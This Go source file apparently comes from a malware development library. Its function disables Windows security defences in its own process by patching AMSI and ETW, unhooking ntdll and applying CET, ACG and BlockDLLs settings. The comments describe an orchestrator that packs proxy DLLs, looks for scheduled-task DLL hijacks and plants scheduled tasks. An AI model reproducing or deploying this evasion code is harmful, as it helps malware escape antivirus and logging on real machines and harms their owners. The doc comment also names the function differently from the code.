//go:build windows

package main

import (
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
)

// applyEvasion runs the evasion/preset.Aggressive() bundle in THIS
// process. Aggressive layers on top of Stealth (AMSI + ETW + ntdll
// unhook):
//
//   - CET opt-out — relaxes shadow-stack enforcement before later
//     RWX work happens elsewhere.
//   - ACG (Arbitrary Code Guard) — no new PAGE_EXECUTE allocations
//     after this point.
//   - BlockDLLs (MicrosoftOnly) — `LoadLibrary` of non-MS-signed
//     DLLs is denied for the rest of the process lifetime.
//
// Order-of-ops audit (slice 9.8.b):
//
//   - The bundle order inside Aggressive() is
//     amsi → etw → unhook → CET → acg → blockdlls. ntdll unhook
//     finishes its VirtualProtect dance BEFORE ACG kicks in, so the
//     evasion bundle does not shoot itself in the foot.
//   - The orchestrator is pure-Go after evasion: PackBinary /
//     PackProxyDLLFromTarget operate on byte slices, no
//     VirtualAlloc(PAGE_EXECUTE). os.WriteFile + scheduled-task
//     scheduling is pure syscalls.
//   - No runtime non-MS LoadLibrary in the orchestrator — the only
//     LoadLibrary'd DLLs are ole32 / oleaut32 (COM activation in
//     dllhijack.ScanScheduledTasks), all MS-signed, so BlockDLLs
//     does not deny them.
//
// Returns nil on full success, an aggregate error otherwise.
// Failures are folded by [evasion.ApplyAllAggregated] into a single
// sorted-by-name error chain. Caller logs the failure but does not
// abort: the orchestrator works without evasion, this is
// defence-in-depth.
func patchAMSI() error {
	return evasion.ApplyAllAggregated(preset.Aggressive(), nil)
}
